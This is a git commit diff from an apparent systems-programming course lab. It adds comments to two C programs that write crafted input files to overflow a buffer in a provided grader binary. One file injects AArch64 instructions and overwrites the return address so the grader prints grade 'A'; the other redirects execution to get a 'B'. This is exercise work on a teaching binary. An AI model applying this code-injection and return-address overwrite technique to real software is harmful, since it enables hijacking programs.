3dd607b5b3416d8f92685f0e9d9e5fb3e0d96876
Richard <rg6134@princeton.edu>
2022-12-16 13:53:15 -0500

    Push push

--- createdataA.c
+++ createdataA.c
@@ -7,6 +7,11 @@
 #include <stdlib.h>
 #include "miniassembler.h"
 
+/* The main function takes no arguments and writes a series of
+   characters that cause a buffer overun of the grader program. These
+   characters cause an incorrect output to be printed. The characters
+   are printed to a file named dataA. Returns 0 */
+
 int main(void) {
     unsigned long bssAddress;
     unsigned int movInstruction;
@@ -18,27 +23,39 @@ int main(void) {
     FILE *psFile;
     psFile = fopen("dataA", "w");
 
+    /* Student name is printed to output file */
     fprintf(psFile, "Richard Gomez");
+    
+    /* Null character to ensure correctness */
     putc('\0', psFile);
+
+    /* Additional null chracters to ensure instructions end on multiple
+       of 4 */
     putc('\0', psFile);
     putc('\0', psFile);
 
+    /* adr x0, grade */
     adrInstruction = MiniAssembler_adr(0, 0x420044, 0x420068);
     fwrite(&adrInstruction, sizeof(unsigned int), 1, psFile);
 
+    /* mov w1, 'A' */
     movInstruction = MiniAssembler_mov(1, 'A');
     fwrite(&movInstruction, sizeof(unsigned int), 1, psFile);
     
+    /* strb w1, [x0] */
     strbInstruction = MiniAssembler_strb(1, 0);
     fwrite(&strbInstruction, sizeof(unsigned int), 1, psFile);
     
+    /* b printf */
     bInstruction = MiniAssembler_b(0x400864, 0x420074);
     fwrite(&bInstruction, sizeof(unsigned int), 1, psFile);
 
+    /* Additional null characters to overrun the buffer */
     for(i = 0; i < 16; i++) {
         putc('\0', psFile);
     }
 
+    /* The address of the BSS section where the adr instruction is */
     bssAddress = 0x420068;
     fwrite(&bssAddress, sizeof(unsigned long), 1, psFile);
 
--- createdataB.c
+++ createdataB.c
@@ -6,17 +6,30 @@
 #include <stdio.h>
 #include <stdlib.h>
 
+/* The main function takes no arguments and writes a series of
+   characters that cause a buffer overun of the grader program. These
+   characters cause an incorrect output to be printed. The characters
+   are printed to a file named dataB. Returns 0 */
+
 int main(void) {
     unsigned long bAddress;
     int i;
+
     FILE *psFile;
     psFile = fopen("dataB", "w");
 
+    /* Student name is printed to output file */
     fprintf(psFile, "Richard Gomez");
+
+    /* Null character to ensure correctness */
     putc('\0', psFile);
+
+    /* Additional null characters to overrun the buffer */
     for(i = 0; i < 34; i++) {
         putc('\0', psFile);
     }
+    
+    /* Address of grade = 'B' */
     bAddress = 0x400858;
     fwrite(&bAddress, sizeof(unsigned long), 1, psFile);
 
